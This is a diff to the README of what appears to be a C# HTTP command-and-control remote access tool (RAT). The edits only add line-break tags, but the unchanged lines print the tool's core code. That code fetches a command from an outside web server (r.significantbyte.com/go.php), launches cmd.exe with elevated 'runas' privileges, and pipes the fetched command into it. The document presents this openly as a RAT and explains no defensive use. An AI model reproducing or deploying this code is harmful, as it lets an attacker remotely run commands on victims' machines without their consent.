@@ -1,11 +1,11 @@
 # http-command-and-control Remote Access Tool (RAT) using c# >
 
-<b>Let's understand it.</b>
+<b>Let's understand it.</b><br>
 <b>This will get the command from online web server.
-</b>
+</b><br>
                           new WebClient().DownloadString("https://r.significantbyte.com/go.php");
-
-<b>Run command in device.</b>
+<br>
+<b>Run command in device.</b><br>
                             Process cmd = new Process();
                             cmd.StartInfo.FileName = "cmd.exe";
                             cmd.StartInfo.RedirectStandardInput = true;
@@ -15,7 +15,7 @@
                             cmd.StartInfo.Verb = "runas";
                             cmd.Start();
                             cmd.StandardInput.WriteLine(json);
-                            
+                            <br>
   
 <b>Lets wait for 1 second</b>
                             Thread.Sleep(1000);
